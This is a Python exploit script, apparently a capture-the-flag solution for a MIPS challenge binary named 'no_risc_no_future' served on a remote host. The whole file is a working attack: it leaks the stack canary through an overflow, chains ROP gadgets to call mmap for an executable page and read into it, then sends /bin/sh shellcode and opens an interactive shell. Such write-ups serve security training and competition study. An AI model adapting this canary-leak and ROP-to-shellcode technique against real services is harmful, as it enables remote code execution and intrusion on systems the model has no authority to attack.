#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './no_risc_no_future'
context(os = 'linux', arch = 'mips')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'PROC', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':['./qemu-mipsel-static', '-g', '1234', bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'noriscnofuture.forfuture.fluxfingers.net', 'port':1338})
env.select()

#==========

binf = ELF(bin_file)
addr_main           = binf.sep_function['main']
addr_mmap           = binf.sep_function['mmap']
addr_read           = binf.sep_function['read']

addr_20             = 0x004002f4 # lw $ra, 0x1c($sp) ; jr $ra ; addiu $sp, 0x20
addr_lw_s0_1_28     = 0x0040dbe0 # lw $ra, 0x24($sp) ; lw $s1, 0x20($sp) ; lw $s0, 0x1c($sp) ; jr $ra ; addiu $sp, 0x28
#addr_lw_s0_5_38     = 0x00400f24 # lw $ra, 0x34($sp) ; lw $s5, 0x30($sp) ; lw $s4, 0x2c($sp) ; lw $s3, 0x28($sp) ; lw $s2, 0x24($sp) ; lw $s1, 0x20($sp) ; lw $s0, 0x1c($sp) ; jr $ra ; addiu $sp, 0x38
#addr_move_a0_a1     = 0x0042ebb4 # move $a1, $s0 ; move $t9, $s1 ; jalr $t9 ; move $a0, $s3
#addr_move_a2_a3     = 0x00444b78 # move $a3, $s1 ; move $t9, $s0 ; jalr $t9 ; move $a2, $s5

# addr_lw_a1          = 0x0042c40c # lw $a1, 0x48($sp) ; lw $t9, 0x1c($sp) ; jalr $t9
# addr_lw_a3_a1       = 0x0044b078 # lw $a3, 0x18($s5) ; lw $a1, 0x88($sp) ; lw $t9, 0x4c($sp) ; jalr $t9
# addr_lw_a2          = 0x00461660 # lw $a2, 0x30($sp) ; move $a0, $s1 ; lw $t9, 0x34($sp) ; jalr $t9
# addr_lw_a0          = 0x00429994 # lw $a0, 0x2c($sp) ; lw $t9, 0x3c($sp) ; jalr $t9

addr_lw_v0          = 0x0042eba4 # lw $v0, 0x18($sp) ; addu $s3, $s7, $s4 ; addu $fp, $v0, $s5 ; move $a2, $s2 ; move $a1, $s0 ; move $t9, $s1 ; jalr $t9
addr_load_args      = 0x00451f34 # lw $ra, 0x24($sp) ; lw $a0, 0x10($sp) ; lw $a1, 0x14($sp) ; lw $a2, 0x18($sp) ; lw $a3, 0x1c($sp) ; addiu $sp, $sp, 0x28 ; move $t9, $v0 ; jr $t9

addr_buf            = 0x01000000

#==========

def attack(conn, **kwargs):
    conn.send('a'*0x40+'!')
    conn.recvuntil('!')
    canary = u32('\x00'+conn.recvuntil('\n', drop=True))
    info('canary    = 0x{:08x}'.format(canary))

    exploit  = 'a'*0x40
    exploit += p32(canary)
    exploit += p32(0xcafebabe)
    '''
    exploit += p32(addr_lw_s0_5_38)
    exploit += 'X'*0x1c
    exploit += p32(addr_lw_s0_1_28) # s0 -> t9
    exploit += p32(3)               # s1 -> a3
    exploit += 'X'*0x4
    exploit += p32(0)               # s3 -> a0
    exploit += 'X'*0x4
    exploit += p32(2)               # s5 -> a2
    exploit += p32(addr_move_a2_a3)
    exploit += 'Y'*0x1c
    exploit += p32(1)               # s0 -> a1
    exploit += p32(addr_mmap)       # s1 -> t9
    exploit += p32(addr_move_a0_a1)
    exploit += 'Z'*0x10
    exploit += p32(4)
    exploit += p32(5)
    '''
    exploit += p32(addr_lw_s0_1_28)
    exploit += 'A'*0x1c
    exploit += 'A'*0x4
    exploit += p32(addr_20)         # s1 -> t9
    exploit += p32(addr_lw_v0)
    exploit += 'B'*0x18
    exploit += p32(addr_mmap)       # v0 -> t9
    exploit += p32(addr_load_args)
    exploit += 'C'*0x10
    exploit += p32(addr_buf)        # a0
    exploit += p32(0x1000)          # a1
    exploit += p32(constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC)    # a2
    exploit += p32(constants.MAP_PRIVATE | constants.MAP_ANONYMOUS)                     # a3
    exploit += 'C'*4
    exploit += p32(addr_main)       # ra
    exploit += 'D'*0x10
    exploit += p(-1)
    exploit += p32(0)
    conn.send(exploit)
    conn.recvuntil('\n')

    for i in range(8):
        conn.sendline(str(i)+'\x00')
        conn.recvuntil('\n')

    exploit  = 'a'*0x40
    exploit += p32(canary)
    exploit += p32(0xcafebabe)
    exploit += p32(addr_lw_s0_1_28)
    exploit += 'A'*0x1c
    exploit += 'A'*0x4
    exploit += p32(addr_20)         # s1 -> t9
    exploit += p32(addr_lw_v0)
    exploit += 'B'*0x18
    exploit += p32(addr_read)       # v0 -> t9
    exploit += p32(addr_load_args)
    exploit += 'C'*0x10
    exploit += p32(constants.STDIN_FILENO)  # a0
    exploit += p32(addr_buf)        # a1
    exploit += p32(0x1000)          # a2
    exploit += p32(0xdeadbeef)      # a3
    exploit += 'C'*4
    exploit += p32(addr_buf)        # ra
    conn.send(exploit)
    conn.recvuntil('\n')

    for i in range(9):
        conn.sendline(str(i)+'\x00')
        conn.recvuntil('\n')

    shellasm = shellcraft.sh()
    conn.send(asm(shellasm))

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()

#==========
